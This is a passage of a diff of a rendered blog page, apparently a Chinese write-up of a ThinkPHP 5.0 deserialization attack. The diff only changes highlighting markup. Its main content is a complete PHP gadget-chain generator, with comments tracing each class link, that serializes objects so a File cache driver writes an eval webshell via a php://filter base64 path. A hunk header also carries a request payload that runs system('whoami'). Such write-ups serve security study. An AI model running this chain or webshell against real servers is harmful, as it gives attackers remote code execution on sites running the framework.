-</span><span class="c1"></span><span class="mf">2.</span><span class="k">if</span> <span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$relation</span><span class="p">))</span><span class="c1">//$this-&gt;append可控，导致$relation可控
-</span><span class="c1"></span><span class="mf">3.</span><span class="k">if</span> <span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$modelRelation</span><span class="p">,</span> <span class="s1">&#39;getBindAttr&#39;</span><span class="p">))</span><span class="c1">//后面说
-</span><span class="c1"></span><span class="mf">4.</span><span class="k">if</span> <span class="p">(</span><span class="nv">$bindAttr</span><span class="p">)</span><span class="c1">//后面说
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mf">1.</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">))</span><span class="c1">//$this-&gt;append可控，后面把他设置为&#39;getError&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mf">2.</span><span class="k">if</span> <span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$relation</span><span class="p">))</span><span class="c1">//$this-&gt;append可控，导致$relation可控
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mf">3.</span><span class="k">if</span> <span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$modelRelation</span><span class="p">,</span> <span class="s1">&#39;getBindAttr&#39;</span><span class="p">))</span><span class="c1">//后面说
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mf">4.</span><span class="k">if</span> <span class="p">(</span><span class="nv">$bindAttr</span><span class="p">)</span><span class="c1">//后面说
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>且不满足</p>
 <div class="highlight"><div class="chroma">
@@ -712,10 +712,10 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span>
-<span class="k">elseif</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">))</span>
-<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">elseif</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>其中<code>$value</code>是由这两行确定的：</p>
 <p><img src="https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210417212035.png" alt=""></p>
@@ -728,11 +728,11 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">getError</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">;</span><span class="c1">//$this-&gt;error可控，他决定了$modelRelation的值
-</span><span class="c1"></span><span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getError</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">;</span><span class="c1">//$this-&gt;error可控，他决定了$modelRelation的值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>跟进getRelationDate:</p>
 <p><img src="https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210417222219.png" alt=""></p>
@@ -903,127 +903,127 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
 </span><span class="lnt">120
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">namespace</span> <span class="nx">think\process\pipes</span> <span class="p">{</span>
-    <span class="k">class</span> <span class="nc">Windows</span> <span class="p">{</span>
-        <span class="k">private</span> <span class="nv">$files</span> <span class="o">=</span> <span class="p">[];</span>
-
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$files</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="o">=</span> <span class="p">[</span><span class="nv">$files</span><span class="p">];</span> <span class="c1">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类
-</span><span class="c1"></span>        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">think</span> <span class="p">{</span>
-    <span class="k">abstract</span> <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
-        <span class="k">protected</span> <span class="nv">$append</span> <span class="o">=</span> <span class="p">[];</span>
-        <span class="k">protected</span> <span class="nv">$error</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
-        <span class="k">public</span> <span class="nv">$parent</span><span class="p">;</span>
-
-        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$output</span><span class="p">,</span> <span class="nv">$modelRelation</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parent</span> <span class="o">=</span> <span class="nv">$output</span><span class="p">;</span>  <span class="c1">//$this-&gt;parent=&gt; think\console\Output;
-</span><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;xxx&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;getError&#34;</span><span class="p">);</span>     <span class="c1">//调用getError 返回this-&gt;error
-</span><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span> <span class="o">=</span> <span class="nv">$modelRelation</span><span class="p">;</span>               <span class="c1">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne
-</span><span class="c1"></span>        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">think\model</span><span class="p">{</span>
-    <span class="k">use</span> <span class="nx">think\Model</span><span class="p">;</span>
-    <span class="k">class</span> <span class="nc">Pivot</span> <span class="k">extends</span> <span class="nx">Model</span><span class="p">{</span>
-        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$output</span><span class="p">,</span> <span class="nv">$modelRelation</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="k">parent</span><span class="o">::</span><span class="na">__construct</span><span class="p">(</span><span class="nv">$output</span><span class="p">,</span> <span class="nv">$modelRelation</span><span class="p">);</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">think\model\relation</span><span class="p">{</span>
-    <span class="k">class</span> <span class="nc">HasOne</span> <span class="k">extends</span> <span class="nx">OneToOne</span> <span class="p">{</span>
-
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">namespace</span> <span class="nx">think\model\relation</span> <span class="p">{</span>
-    <span class="k">abstract</span> <span class="k">class</span> <span class="nc">OneToOne</span>
-    <span class="p">{</span>
-        <span class="k">protected</span> <span class="nv">$selfRelation</span><span class="p">;</span>
-        <span class="k">protected</span> <span class="nv">$bindAttr</span> <span class="o">=</span> <span class="p">[];</span>
-        <span class="k">protected</span> <span class="nv">$query</span><span class="p">;</span>
-        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">selfRelation</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span> <span class="o">=</span> <span class="nv">$query</span><span class="p">;</span>    <span class="c1">//$query指向Query
-</span><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bindAttr</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;xxx&#39;</span><span class="p">];</span><span class="c1">// $value值，作为call函数引用的第二变量
-</span><span class="c1"></span>        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">think\db</span> <span class="p">{</span>
-    <span class="k">class</span> <span class="nc">Query</span> <span class="p">{</span>
-        <span class="k">protected</span> <span class="nv">$model</span><span class="p">;</span>
-
-        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$model</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">model</span> <span class="o">=</span> <span class="nv">$model</span><span class="p">;</span> <span class="c1">//$this-&gt;model=&gt; think\console\Output;
-</span><span class="c1"></span>        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">namespace</span> <span class="nx">think\console</span><span class="p">{</span>
-    <span class="k">class</span> <span class="nc">Output</span><span class="p">{</span>
-        <span class="k">private</span> <span class="nv">$handle</span><span class="p">;</span>
-        <span class="k">protected</span> <span class="nv">$styles</span><span class="p">;</span>
-        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">styles</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;getAttr&#39;</span><span class="p">];</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handle</span> <span class="o">=</span><span class="nv">$handle</span><span class="p">;</span> <span class="c1">//$handle-&gt;think\session\driver\Memcached
-</span><span class="c1"></span>        <span class="p">}</span>
-
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">namespace</span> <span class="nx">think\session\driver</span> <span class="p">{</span>
-    <span class="k">class</span> <span class="nc">Memcached</span>
-    <span class="p">{</span>
-        <span class="k">protected</span> <span class="nv">$handler</span><span class="p">;</span>
-
-        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handler</span> <span class="o">=</span> <span class="nv">$handle</span><span class="p">;</span> <span class="c1">//$handle-&gt;think\cache\driver\File
-</span><span class="c1"></span>        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">think\cache\driver</span> <span class="p">{</span>
-    <span class="k">class</span> <span class="nc">File</span>
-    <span class="p">{</span>
-        <span class="k">protected</span> <span class="nv">$options</span><span class="o">=</span><span class="k">null</span><span class="p">;</span>
-        <span class="k">protected</span> <span class="nv">$tag</span><span class="p">;</span>
-
-        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">=</span><span class="p">[</span>
-                <span class="s1">&#39;expire&#39;</span> <span class="o">=&gt;</span> <span class="mi">3600</span><span class="p">,</span> 
-                <span class="s1">&#39;cache_subdir&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span> 
-                <span class="s1">&#39;prefix&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> 
-                <span class="s1">&#39;path&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#39;</span><span class="p">,</span>
-                <span class="s1">&#39;data_compress&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
-            <span class="p">];</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">tag</span> <span class="o">=</span> <span class="s1">&#39;xxx&#39;</span><span class="p">;</span>
-        <span class="p">}</span>
-
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="p">{</span>
-    <span class="nv">$Memcached</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">think\session\driver\Memcached</span><span class="p">(</span><span class="k">new</span> <span class="nx">\think\cache\driver\File</span><span class="p">());</span>
-    <span class="nv">$Output</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">think\console\Output</span><span class="p">(</span><span class="nv">$Memcached</span><span class="p">);</span>
-    <span class="nv">$model</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">think\db\Query</span><span class="p">(</span><span class="nv">$Output</span><span class="p">);</span>
-    <span class="nv">$HasOne</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">think\model\relation\HasOne</span><span class="p">(</span><span class="nv">$model</span><span class="p">);</span>
-    <span class="nv">$window</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">think\process\pipes\Windows</span><span class="p">(</span><span class="k">new</span> <span class="nx">think\model\Pivot</span><span class="p">(</span><span class="nv">$Output</span><span class="p">,</span><span class="nv">$HasOne</span><span class="p">));</span>
-    <span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$window</span><span class="p">);</span>
-    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$window</span><span class="p">));</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\process\pipes</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Windows</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$files</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$files</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="o">=</span> <span class="p">[</span><span class="nv">$files</span><span class="p">];</span> <span class="c1">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">abstract</span> <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$append</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$error</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$parent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$output</span><span class="p">,</span> <span class="nv">$modelRelation</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parent</span> <span class="o">=</span> <span class="nv">$output</span><span class="p">;</span>  <span class="c1">//$this-&gt;parent=&gt; think\console\Output;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;xxx&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;getError&#34;</span><span class="p">);</span>     <span class="c1">//调用getError 返回this-&gt;error
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span> <span class="o">=</span> <span class="nv">$modelRelation</span><span class="p">;</span>               <span class="c1">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">think\Model</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Pivot</span> <span class="k">extends</span> <span class="nx">Model</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$output</span><span class="p">,</span> <span class="nv">$modelRelation</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">parent</span><span class="o">::</span><span class="na">__construct</span><span class="p">(</span><span class="nv">$output</span><span class="p">,</span> <span class="nv">$modelRelation</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model\relation</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">HasOne</span> <span class="k">extends</span> <span class="nx">OneToOne</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model\relation</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">abstract</span> <span class="k">class</span> <span class="nc">OneToOne</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$selfRelation</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$bindAttr</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$query</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">selfRelation</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span> <span class="o">=</span> <span class="nv">$query</span><span class="p">;</span>    <span class="c1">//$query指向Query
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bindAttr</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;xxx&#39;</span><span class="p">];</span><span class="c1">// $value值，作为call函数引用的第二变量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\db</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Query</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$model</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$model</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">model</span> <span class="o">=</span> <span class="nv">$model</span><span class="p">;</span> <span class="c1">//$this-&gt;model=&gt; think\console\Output;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\console</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Output</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$handle</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$styles</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">styles</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;getAttr&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handle</span> <span class="o">=</span><span class="nv">$handle</span><span class="p">;</span> <span class="c1">//$handle-&gt;think\session\driver\Memcached
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\session\driver</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Memcached</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$handler</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handler</span> <span class="o">=</span> <span class="nv">$handle</span><span class="p">;</span> <span class="c1">//$handle-&gt;think\cache\driver\File
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\cache\driver</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">File</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$options</span><span class="o">=</span><span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$tag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">=</span><span class="p">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;expire&#39;</span> <span class="o">=&gt;</span> <span class="mi">3600</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;cache_subdir&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;prefix&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;path&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;data_compress&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">tag</span> <span class="o">=</span> <span class="s1">&#39;xxx&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$Memcached</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">think\session\driver\Memcached</span><span class="p">(</span><span class="k">new</span> <span class="nx">\think\cache\driver\File</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$Output</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">think\console\Output</span><span class="p">(</span><span class="nv">$Memcached</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$model</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">think\db\Query</span><span class="p">(</span><span class="nv">$Output</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$HasOne</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">think\model\relation\HasOne</span><span class="p">(</span><span class="nv">$model</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$window</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">think\process\pipes\Windows</span><span class="p">(</span><span class="k">new</span> <span class="nx">think\model\Pivot</span><span class="p">(</span><span class="nv">$Output</span><span class="p">,</span><span class="nv">$HasOne</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$window</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$window</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
